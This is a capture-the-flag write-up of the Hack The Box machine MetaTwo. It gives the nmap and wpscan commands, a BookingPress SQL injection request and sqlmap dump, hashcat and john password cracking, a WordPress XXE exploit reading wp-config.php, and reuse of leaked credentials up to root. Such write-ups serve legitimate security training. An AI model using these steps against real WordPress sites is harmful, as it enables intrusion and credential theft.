---
title:  "Writeup of MetaTwo machine of Hack The Box"
date: 2022-11-25
mathjax: true
layout: post
categories: writeup
tags: CVE wordpress sql-injection burpsuite sqlmap hashcat john ftp pgp
---

# Resolution of MetaTwo machine of Hack The Box

![](https://raw.githubusercontent.com/mateofumis/mateofumis.github.io/master/assets/img/metapress.htb/metatwo.webp)

### 🚀 *"The key to this machine is to look for Wordpress vulnerabilities."*

**First, we will perform a quick scan of the machine only for open ports with the “Nmap” tool.**

```bash
sudo nmap 10.10.11.186 -vvv -Pn -p- --min-rate 5000 --open -sS -oG
```
    
With the previous command we export the result in a format in which we can extract the open ports with the help of the command *"grep"* and then scan in depth with the following command:

```bash
sudo nmap 10.10.11.186 -p21,22,80 -sVC -Pn -vvv -oN
```

#### Now with the complete scan we obtain the following result:

![](https://raw.githubusercontent.com/mateofumis/mateofumis.github.io/master/assets/img/metapress.htb/nmap-scanComplete.webp)

**We see that port 80 is open running the http service and we also see the DNS of `metapress.htb`, so let's check the page **.

##### For this it is advisable to add the DNS "metapress.htb" with the IP of the machine, in the /etc/hosts file to avoid having to write the IP each time:

Add the following line at the end of /etc/hosts

```
10.10.11.186	metapress.htb	# Máquina MetaTwo
```

![](https://raw.githubusercontent.com/mateofumis/mateofumis.github.io/master/assets/img/metapress.htb/metapress-htb.webp)

#### With the Wappalyzer extension we see that Wordpress is running, so we could search for vulnerabilities with the "Wpscan" tool.

![](https://raw.githubusercontent.com/mateofumis/mateofumis.github.io/master/assets/img/wappalyzer-wordpress.webp)

```bash
wpscan --url http://metapress.htb --plugins-detection mixed -e ap,at -t 450 --api-token {TU API TOKEN}
```

**After the tool has finished scanning, we found a vulnerability to exploit:**


> [!] 1 vulnerability identified:  
> [!] Title: BookingPress < 1.0.11
>  Unauthenticated SQL Injection  
> - Fixed in: 1.0.11  
> - References: https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357 
> - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0739 
> - https://plugins.trac.wordpress.org/changeset/2684789


 **Based on this, we proceed to execute the vulnerability exploit:**
 
#### First we create an event inside the metapress.htb/events page. Which means that we already did the first part of the exploit.

#### Then we look for the "nonce" code in the HTML source code of the event creation page: “http://metapress.htb/events/”. The ***"nonce"*** code is in my case "f5c16a06dd". We already have it! So we proceed:

```bash
curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=f5c16a06dd&category_id=1&total_service=1'
```

Output in console:

```
HTTP/1.1 200 OK Server: nginx/1.18.0 Date: Fri, 25 Nov 2022 16:41:51
GMT Content-Type: text/html; charset=UTF-8 Transfer-Encoding: chunked
Connection: keep-alive X-Powered-By: PHP/8.0.24 X-Robots-Tag: noindex
X-Content-Type-Options: nosniff Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0 X-Frame-Options:
SAMEORIGIN Referrer-Policy: strict-origin-when-cross-origin

[{"bookingpress_service_id":"1","bookingpress_category_id":"1","bookingpress_service_name":"Startup meeting","bookingpress_service_price":"$0.00","bookingpress_service_duration_val":"30","bookingpress_service_duration_unit":"m","bookingpress_service_description":"Join us, we will celebrate our startup!","bookingpress_service_position":"0","bookingpress_servicedate_created":"2022-06-23","18:02:38","service_price_without_currency":0,"img_url":"http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg"}]
```

As we can see in the console, the site is vulnerable to *SQL Injection*, so we use the **"SQLmap"** tool. But for this we need the **req.txt** file that we will get using the **Burp Suite** tool in such a way that we direct the POST request with the "curl" command adding the "--proxy" parameter to capture the traffic. 

## This works in the following way:

#### We send the same POST request with "curl" but we direct the traffic through our proxy to our local host (localhost) on port 8080 with the command: 

```bash
curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=f5c16a06dd&category_id=1&total_service=1' --proxy 127.0.0.1:8080
```

#### After being captured by Burp Suite, we copy the Request to the file "req.txt" (or any name, using "req.txt" is good practice to remember what file it is):

![](https://raw.githubusercontent.com/mateofumis/mateofumis.github.io/master/assets/img/metapress.htb/burpsuite-copy-to-file.webp)

## And here we go with SQLmap:

**After launching several commands, we discover a database called "blog" with a table "wp_users" so we list it with the following command:**

This will use brute force SQL Injection codes with the default SQLmap dictionary:

```bash
sqlmap -r req.txt -p "total_service"  --threads 9 --batch -D blog -T wp_users --dump
```

#### It turns out that we got lucky, and managed to obtain the following:

user_login: `admin`
user_pass: `$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.`

user_login: `manager`
user_pass: `$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70`

**With these password hashes of the "admin" and "manager" users, we can identify what type of hash they are, with the "hash-identifier" utility **.

> Possible Hashs: [+] MD5(Wordpress)

#### At this point we proceed to crack the hash of the user "manager" with Hashcat


### We will use the dictionary "rockyou.txt" which is the default on CTF machines:

```bash
hashcat -a 0 -m 400 hash.txt /usr/share/wordlists/rockyou.txt -o password_of_manager_user -O
```

- Where "hash.txt" is the hash which we discovered using SQLmap from manager user: 
`$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70`. And where "400" is the hashcat code for **MD5(Wordpress)**.

- The result after waiting for Hashcat to do its job is as follows:

- password: **partylikearockstar**

### We can now log in to the Wordpress Login portal at http://metapress.htb/wp-login.php.

- Username: manager
- Password: partylikearockstar

Within the user panel we find that we can upload content. For this, if we examine the **Wpscan** results we got earlier, there is a **XXE** vulnerability that we can exploit.

> [!] Title: WordPress 5.6-5.7 - Authenticated XXE Within the Media | Library Affecting PHP 8  
> - Fixed in: 5.6.3     
> - References:  https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5 
> - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29447   
> - https://wordpress.org/news/2021/04/wordpress-5-7-1-security-and-maintenance-release/
> - https://core.trac.wordpress.org/changeset/29378 
> - https://blog.wpscan.com/2021/04/15/wordpress-571-security-vulnerability-release.html
> - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-rv47-pc52-qrhh
> - https://blog.sonarsource.com/wordpress-xxe-security-vulnerability/
> - https://hackerone.com/reports/1095645
> - https://www.youtube.com/watch?v=3NBxcmqCgt4

#### We confirmed with Wappalyzer earlier that the site uses PHP version 8, so it is vulnerable.

#### If we search the internet there are many exploits to use, in my case I am going to use one I found on Github: https://github.com/motikan2010/CVE-2021-29447

Once the vulnerability is exploited, we find: 

- The credentials to connect to the **FTP** server in the ***"wp-config.php"*** file.

> define( 'FS_METHOD', 'ftpext' ); 

> define( 'FTP_USER', 'metapress.htb'); 

> define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' ); 

> define( 'FTP_HOST', 'ftp.metapress.htb' ); define( 'FTP_BASE', 'blog/' );

> define( 'FTP_SSL', false );

- The user **"jnelson"** in /etc/passwd with access to a bash shell.

![](https://raw.githubusercontent.com/mateofumis/mateofumis.github.io/master/assets/img/metapress.htb/etc-passwd.webp)

#### Then we proceed to connect to the FTP service with the credentials we have obtained.

```bash
ftp metapress.htb@10.10.11.186 #contraseña: 9NYS_ii@FyL_p5M2NvJ
```

We can see in the **"mailer"** folder the **send_email.php** file containing the email credentials of the user **"jnelson"**:

> $mail->Username = "jnelson@metapress.htb";                 
> $mail->Password = "Cb4_JmWM8zUZWMu@Ys";

## Let's go! We connects via SSH

Fortunately the password for **jnelson**'s *mail* is the same as in the *ssh* connection, so we managed to get a connection and then it's time to escalate privileges:

```bash
ssh jnelson@10.10.11.186 # contraseña: Cb4_JmWM8zUZWMu@Ys
```

- We get the user flag in the /home/jnelson directory.

- After checking all the visible and hidden files, we immediately find a PGP key and a PGP message in the files:

  - /home/jnelson/.passpie/.keys
  - /home/jnelson/.passpie/.ssh/root.pass

#### Now we copy the PGP private key, the message and save it.

- First we need the PGP Private Key password, so we will use the gpg2john tool to crack it.

```bash
gpg2john pgp-private-key.txt > output.txt
```

With this we will obtain the hash ready to crack it with **John**. The command is as follows:

```bash
john output.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Yes, the classic "rockyou.txt" always works with CTFs.

* We got the password: **"blink182"**


## Final step ...

#### Now comes the fun part: privilege escalation.

We have the encrypted message, the PGP Key and the password to decrypt the message. We only need a software to perform this task.

### In my case I used the PGP-Tool, available at: [https://pgptool.github.io/](https://pgptool.github.io/){:target="_blank"}

 This software is Free and Open Source, available on Windows, Linux and Mac OS. The Github repository is the following: [https://github.com/pgptool/pgptool](https://github.com/pgptool/pgptool){:target="_blank"}

#### As it didn't work for me on Linux, maybe it's because of my Java version, I did it on Windows 10 and finally, we get the root password:

![](https://raw.githubusercontent.com/mateofumis/mateofumis.github.io/master/assets/img/metapress.htb/pgp-tool.webp)

```
p7qfAZt4_A1xo_0x
```

Now we just execute:

```bash
su root
```

* Contraseña: "p7qfAZt4_A1xo_0x"


#### We obtain the root flag and terminate the machine.

Happy Hacking!!

----

## Author: Mateo Fumis 
